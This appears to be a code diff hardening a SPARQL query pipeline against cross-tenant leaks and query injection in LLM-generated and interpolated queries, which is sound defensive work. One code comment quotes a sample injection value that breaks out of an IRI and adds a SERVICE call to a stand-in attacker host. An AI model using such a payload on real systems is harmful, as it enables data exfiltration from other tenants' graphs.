@@ -11,6 +11,11 @@ import structlog
 from cograph_client.graph.client import NeptuneClient
 from cograph_client.graph.parser import parse_sparql_results, unbound_projection_vars
 from cograph_client.graph.queries import parse_kg_graph_uri, skip_invalid_type_name
+from cograph_client.graph.sparql_scope import (
+    CrossTenantQueryError,
+    confine_generated_query,
+    tenant_of_graph,
+)
 from cograph_client.models.query import NLResult
 from cograph_client.nlp.prompts import SPARQL_GENERATION_SYSTEM, build_generation_prompt
 from cograph_client.nlp.validator import normalize_sparql, validate_sparql
@@ -402,6 +407,25 @@ def _neptune_safe_duration(sparql: str) -> str:
 _ENTITY_URI_PREFIX = "https://cograph.tech/entities/"
 
 
+#: Codepoints the SPARQL 1.1 IRIREF production forbids INSIDE ``<…>``:
+#: ``'<' ([^<>"{}|^`\] - [#x00-#x20])* '>'``. A value containing any of them
+#: cannot be interpolated into an IRI without changing the query's syntax.
+_IRIREF_FORBIDDEN = frozenset('<>"{}|^`\\')
+
+
+def _is_interpolatable_iri(value: str) -> bool:
+    """True when ``value`` can be written as ``<value>`` and stay one IRI token.
+
+    The check is the IRIREF grammar's own exclusion set rather than a blocklist
+    of the characters one particular payload happened to use: ``>`` terminates
+    the IRI, and every other excluded codepoint is excluded precisely because it
+    could change how the rest of the query tokenises.
+    """
+    return bool(value) and not any(
+        c in _IRIREF_FORBIDDEN or ord(c) <= 0x20 for c in value
+    )
+
+
 def _row_has_entity_object(row: dict) -> bool:
     """True if any value in the row is an entity IRI (``…/entities/…``).
 
@@ -783,6 +807,12 @@ class NLQueryPipeline:
                 last_was_empty_sparql = False
 
                 t2 = time.time()
+                # ONTA-424: the prompt ASKS for a scoped query; this is what
+                # ENFORCES one. A generated query with no dataset clause reads
+                # the union of every named graph on the instance, so nothing
+                # reaches the store until it is provably confined to the graphs
+                # this request already targets.
+                sparql = self._confine_generated(sparql, data_graph, layer_graph_uris)
                 raw = await self.neptune.query(sparql)
                 timing[f"neptune_exec_ms{f'_retry{attempt}' if attempt > 0 else ''}"] = round((time.time() - t2) * 1000, 1)
                 variables, bindings = parse_sparql_results(raw)
@@ -794,7 +824,9 @@ class NLQueryPipeline:
                 # behavior — whenever the first query already returned rows, isn't a
                 # single-subtype name lookup, or the type has no supertype.
                 if not bindings:
-                    broadened = await self._broaden_name_lookup(sparql, graph_uri)
+                    broadened = await self._broaden_name_lookup(
+                        sparql, graph_uri, data_graph, layer_graph_uris
+                    )
                     if broadened is not None:
                         b_sparql, b_raw = broadened
                         b_variables, b_bindings = parse_sparql_results(b_raw)
@@ -940,7 +972,10 @@ class NLQueryPipeline:
                 if missing_vars:
                     timing["unbound_projection_vars"] = ", ".join(missing_vars)
                     logger.info("unbound_projection_vars", vars=missing_vars, question=question)
-                answer = await self._format_answer(bindings, explanation, missing_vars=missing_vars)
+                answer = await self._format_answer(
+                    bindings, explanation, missing_vars=missing_vars,
+                    data_graph=data_graph,
+                )
                 # ONTA-258/ONTA-450: "" unless the zero rows are explained by a
                 # declared-but-empty type the question named.
                 answer += honest_empty_note
@@ -1009,6 +1044,13 @@ class NLQueryPipeline:
                     citations=citations,
                     coverage_caveat=coverage_caveat,
                 )
+            except CrossTenantQueryError:
+                # ONTA-424: a generated query that reached at another workspace is
+                # a security event, not a syntax slip. Never retried, and never
+                # summarised back to the model as `last_error` feedback it could
+                # iterate against. `api/routes/ask.py` catches it at the boundary
+                # and returns the generic degraded NLResult.
+                raise
             except Exception as e:
                 last_error = str(e)
                 # If the attempt died BEFORE producing a query (generation raised,
@@ -1036,6 +1078,37 @@ class NLQueryPipeline:
             explanation=explanation,
             ontology=ontology,
             timing=timing,
+        )
+
+    # ------------------------------------------------ generated-query confinement
+
+    @staticmethod
+    def _confine_generated(
+        sparql: str, data_graph: str, layer_graph_uris: list[str] | None = None
+    ) -> str:
+        """Confine LLM-generated SPARQL to this request's graphs (ONTA-424).
+
+        The single choke point every generated query passes through before it
+        reaches Neptune. Returns the query to run, which is either ``sparql``
+        unchanged or a repaired copy carrying ``FROM <data_graph>``; raises
+        :class:`CrossTenantQueryError` when the generated text reaches outside
+        the request's scope.
+
+        The tenant is derived from ``data_graph`` rather than passed in, and that
+        is deliberate. ``data_graph`` is resolved by the route from the
+        AUTHENTICATED tenant (``/ask`` and the agent's ``QueryCapability`` both
+        build it with ``kg_graph_uri(tenant.tenant_id, ...)``), so it is already
+        the trusted boundary; deriving it means a future caller of ``ask()``
+        cannot forget to thread a tenant and silently lose the guard. A
+        ``data_graph`` outside the platform namespace (a self-hosted store) yields
+        no tenant, and confinement then falls back to the graphs the request
+        itself named, which is strictly tighter than tenant ownership.
+        """
+        return confine_generated_query(
+            sparql,
+            default_graphs=[data_graph],
+            tenant_id=tenant_of_graph(data_graph),
+            allowed_graphs=layer_graph_uris or (),
         )
 
     # ------------------------------------------------ name-lookup broadening
@@ -1084,7 +1157,11 @@ class NLQueryPipeline:
         return False
 
     async def _broaden_name_lookup(
-        self, sparql: str, graph_uri: str
+        self,
+        sparql: str,
+        graph_uri: str,
+        data_graph: str | None = None,
+        layer_graph_uris: list[str] | None = None,
     ) -> tuple[str, dict] | None:
         """Retry a zero-row NAME lookup against the type's SUPERTYPE.
 
@@ -1102,7 +1179,11 @@ class NLQueryPipeline:
 
         Returns ``(broadened_sparql, raw_result)`` from the re-query, or ``None``
         when the query is not a single-subtype NAME lookup, the type has no
-        supertype, or anything errors — best-effort, never raises into ``ask()``.
+        supertype, or anything errors — best-effort. The one exception it lets
+        through is :class:`CrossTenantQueryError` (ONTA-424): swallowing a
+        confinement failure into ``None`` would turn a security event into a
+        silent "no broadening happened", so it propagates to ``ask()``, which
+        re-raises it.
         """
         try:
             if not self._targets_label_name_var(sparql):
@@ -1137,8 +1218,17 @@ class NLQueryPipeline:
             broadened = sparql.replace(f"<{sub_uri}>", f"<{super_uri}>")
             if broadened == sparql:
                 return None
+            # ONTA-424: re-confine rather than inherit the caller's verdict. The
+            # substitution above only rewrites a `types/` URI today, so the
+            # dataset cannot change, but the guard belongs at the store call and
+            # not at whichever transform happens to precede it.
+            broadened = self._confine_generated(
+                broadened, data_graph or graph_uri, layer_graph_uris
+            )
             raw = await self.neptune.query(broadened)
             return broadened, raw
+        except CrossTenantQueryError:
+            raise
         except Exception:
             logger.debug("name_lookup_broaden_failed", exc_info=True)
             return None
@@ -1318,7 +1408,7 @@ class NLQueryPipeline:
                 desc = desc[len(article):]
         if not desc:
             return None
-        q = (
+        anchor_query = (
             f"SELECT ?wkt FROM <{data_graph}> WHERE {{ "
             f"?e ?lp ?lbl . "
             f'FILTER(isLiteral(?lbl) && CONTAINS(LCASE(STR(?lbl)), "{desc}")) '
@@ -1327,7 +1417,7 @@ class NLQueryPipeline:
             f"}} LIMIT 1"
         )
         try:
-            raw = await self.neptune.query(q)
+            raw = await self.neptune.query(anchor_query)
             _, rows = parse_sparql_results(raw)
         except Exception:
             logger.warning("anchor_resolve_failed", exc_info=True)
@@ -1404,9 +1494,12 @@ class NLQueryPipeline:
         constrains the projection to the entity IRI (``?uri``) and extracts it.
 
         Returns a deduped, order-preserving list capped at ``limit``. Returns
-        ``[]`` on any failure (unparseable/invalid SPARQL, Neptune error, or no
-        IRI column) — never raises; the caller decides how to handle "couldn't
-        resolve".
+        ``[]`` on any failure (unparseable/invalid SPARQL, Neptune error, a
+        generated query that could not be confined to this workspace, or no IRI
+        column) — never raises; the caller decides how to handle "couldn't
+        resolve". ``[]`` is the fail-closed outcome here: the store is never
+        called, and a confinement failure is logged as its own security event by
+        ``graph/sparql_scope.py`` before it is swallowed.
         """
         data_graph = instance_graph or graph_uri
         try:
@@ -1431,6 +1524,9 @@ class NLQueryPipeline:
             if not is_valid:
                 logger.warning("select_entity_uris_invalid_sparql", error=error)
                 return []
+            # ONTA-424: same enforcement as ask(); this path generates SPARQL
+            # from the same prompt and runs it against the same store.
+            sparql = self._confine_generated(sparql, data_graph)
             raw = await self.neptune.query(sparql)
             _, bindings = parse_sparql_results(raw)
         except Exception:
@@ -1578,11 +1674,15 @@ class NLQueryPipeline:
         """
         from cograph_client.graph.layers import type_name_from_uri
 
-        query = (
+        # Named for what it is, not `query`: the confinement drift guard in
+        # tests/test_generated_sparql_scoping.py is deny-by-default and a
+        # generically-named local would have to be allowlisted, which would then
+        # wave through the next generated query that happened to reuse the name.
+        type_scan_query = (
             f"SELECT DISTINCT ?type FROM <{instance_graph}> "
             f"WHERE {{ ?s <{RDF_TYPE_URI}> ?type }}"
         )
-        _, rows = parse_sparql_results(await self.neptune.query(query))
+        _, rows = parse_sparql_results(await self.neptune.query(type_scan_query))
         out: set[str] = set()
         for row in rows:
             # type_name_from_uri understands tenant / public / enhanced
@@ -1958,11 +2058,11 @@ class NLQueryPipeline:
 
                 # Define cardinality check function ONCE (used for both attrs and rels)
                 async def _count_predicate(tn: str, an: str, uri: str) -> tuple[str, str, int]:
-                    q = (
+                    count_query = (
                         f"SELECT (COUNT(DISTINCT ?val) AS ?cnt) FROM <{instance_graph}> "
                         f"WHERE {{ ?s <{uri}> ?val }}"
                     )
-                    raw = await self.neptune.query(q)
+                    raw = await self.neptune.query(count_query)
                     _, bindings = parse_sparql_results(raw)
                     cnt = int(bindings[0].get("cnt", 0)) if bindings else 0
                     return tn, an, cnt
@@ -1991,11 +2091,11 @@ class NLQueryPipeline:
 
                         # Phase 2: Concurrent value fetches for low-cardinality attrs
                         async def _fetch_vals(tn: str, an: str, uri: str) -> tuple[str, str, list[str]]:
-                            q = (
+                            enum_values_query = (
                                 f"SELECT DISTINCT ?val FROM <{instance_graph}> "
                                 f"WHERE {{ ?s <{uri}> ?val }} LIMIT {MAX_ENUM_CARDINALITY}"
                             )
-                            raw = await self.neptune.query(q)
+                            raw = await self.neptune.query(enum_values_query)
                             _, bindings = parse_sparql_results(raw)
                             return tn, an, [r["val"] for r in bindings if r.get("val")]
 
@@ -2768,21 +2868,57 @@ class NLQueryPipeline:
         path = unquote(uri.replace("https://cograph.tech/", ""))
         return path.split("/")[-1]
 
-    async def _resolve_uri_labels(self, bindings: list[dict]) -> dict[str, str]:
+    async def _resolve_uri_labels(
+        self, bindings: list[dict], data_graph: str | None = None
+    ) -> dict[str, str]:
         """Batch-resolve rdfs:label for all Omnix entity/type URIs in bindings.
 
         Returns a mapping from URI → human-readable label.
         Falls back to extracting the last URI path segment if no label is found.
+
+        ONTA-424: ``data_graph`` scopes the lookup. This query named no graph,
+        and on Neptune that means the union of every named graph on the
+        instance. It is not generated SPARQL, but it is the same leak: entity
+        IRIs are minted from the TYPE and the value
+        (``entities/<Type>/<safe_id>``, see ``graph/ontology_queries.py``) with
+        no tenant segment, so two workspaces holding the same real-world thing
+        mint the SAME IRI. An unscoped ``VALUES ?uri { … } ?uri rdfs:label
+        ?label`` therefore returns whatever label ANOTHER workspace attached to
+        that IRI, and the answer renders it as ours.
         """
-        # Collect all unique URIs that look like Omnix entities or types
+        # Collect all unique URIs that look like Omnix entities or types.
+        #
+        # The prefix test alone is NOT enough to interpolate a value into
+        # `<{u}>`. `parse_sparql_results` flattens every binding to its `.value`
+        # string, so a LITERAL is indistinguishable from an IRI here — and a
+        # literal is arbitrary text the workspace's own ingest put in the graph.
+        # A value that merely STARTS with the entities prefix and then carries
+        # `>` closes the IRI early, and the rest of it becomes query syntax:
+        #
+        #     https://cograph.tech/entities/X> } SERVICE <http://attacker/> { … } }#
+        #
+        # parses cleanly and gives the attacker an outbound SERVICE call from
+        # inside the VPC. That is the same channel rule C rejects on the raw
+        # route. `_is_interpolatable_iri` applies the SPARQL IRIREF grammar's own
+        # exclusion set, so nothing that could terminate or escape the IRI is
+        # ever interpolated. Dropping a value only costs it a label (the
+        # `_humanize_uri` fallback below still names it).
         uris: set[str] = set()
         for row in bindings:
             for v in row.values():
-                if isinstance(v, str) and (
+                if not isinstance(v, str):
+                    continue
+                if not (
                     v.startswith("https://cograph.tech/entities/")
                     or v.startswith("https://cograph.tech/types/")
                 ):
-                    uris.add(v)
+                    continue
+                if not _is_interpolatable_iri(v):
+                    logger.warning(
+                        "label_lookup_skipped_unsafe_value", value_prefix=v[:60]
+                    )
+                    continue
+                uris.add(v)
 
         if not uris:
             return {}
@@ -2791,8 +2927,9 @@ class NLQueryPipeline:
 
         # Batch SPARQL query to fetch rdfs:label for all URIs at once
         values_clause = " ".join(f"<{u}>" for u in uris)
+        scope = f"FROM <{data_graph}> " if data_graph else ""
         label_query = (
-            f"SELECT ?uri ?label WHERE {{ "
+            f"SELECT ?uri ?label {scope}WHERE {{ "
             f"VALUES ?uri {{ {values_clause} }} "
             f"?uri <http://www.w3.org/2000/01/rdf-schema#label> ?label . "
             f"}}"
@@ -2820,6 +2957,7 @@ class NLQueryPipeline:
         bindings: list[dict],
         explanation: str,
         missing_vars: list[str] | None = None,
+        data_graph: str | None = None,
     ) -> str:
         # `missing_vars` are projected columns that bound in zero rows — reported
         # honestly (see `unbound_projection_vars`) so the caller can tell "column
@@ -2852,7 +2990,7 @@ class NLQueryPipeline:
             return "No results found." + _missing_note()
 
         # Resolve any entity/type URIs to human-readable labels
-        uri_labels = await self._resolve_uri_labels(bindings)
+        uri_labels = await self._resolve_uri_labels(bindings, data_graph)
 
         def _display(value: str) -> str:
             """Return the display form of a binding value, resolving URIs."""
